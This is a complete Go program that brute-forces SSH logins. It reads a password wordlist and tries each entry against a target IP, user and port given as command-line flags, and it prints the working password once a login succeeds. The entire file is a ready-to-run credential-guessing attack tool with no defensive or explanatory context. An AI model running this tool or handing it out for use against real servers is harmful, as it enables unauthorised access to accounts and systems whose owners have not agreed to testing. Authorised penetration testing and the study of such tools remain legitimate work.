package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
	"time"
)

func connectSSH(hostname, username, wordlist string, port int, timeout int) {
	file, err := os.Open(wordlist)
	if err != nil {
		fmt.Printf("[-] Error opening wordlist: %v\n", err)
		return
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		password := scanner.Text()

		config := &ssh.ClientConfig{
			User: username,
			Auth: []ssh.AuthMethod{
				ssh.Password(password),
			},
			Timeout: time.Duration(timeout) * time.Second,
		}

		client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", hostname, port), config)
		if err == nil {
			client.Close()
			fmt.Printf("[+] Login successfuly. Password: %s\n", password)
			fmt.Printf("[~] End: The processing has been finished.\n")
			os.Exit(0)
		} else {
			fmt.Printf("[-] Password Refused. Wrong Password: %s\n", password)
		}
	}

	fmt.Printf("[~] End: The processing has been finished. Password Not Found!\n")
}

func main() {
	server := flag.String("i", "", "Target IP Address (required)")
	username := flag.String("u", "", "SSH User name (required)")
	serverPort := flag.Int("p", 22, "Target Port Number (Default 22)")
	timeout := flag.Int("t", 5, "Request timeout (Default 5)")
	wordlist := flag.String("w", "wordlist.txt", "Passwords File Path (Default: wordlist.txt)")

	flag.Parse()

	if *server == "" || *username == "" {
		flag.PrintDefaults()
		return
	}

	fmt.Printf("Server IP: %s\n", *server)
	fmt.Printf("Username: %s\n", *username)
	fmt.Printf("Server Port: %d\n", *serverPort)
	fmt.Printf("Timeout: %d\n", *timeout)
	fmt.Printf("Wordlist: %s\n", *wordlist)

	connectSSH(*server, *username, *wordlist, *serverPort, *timeout)
}
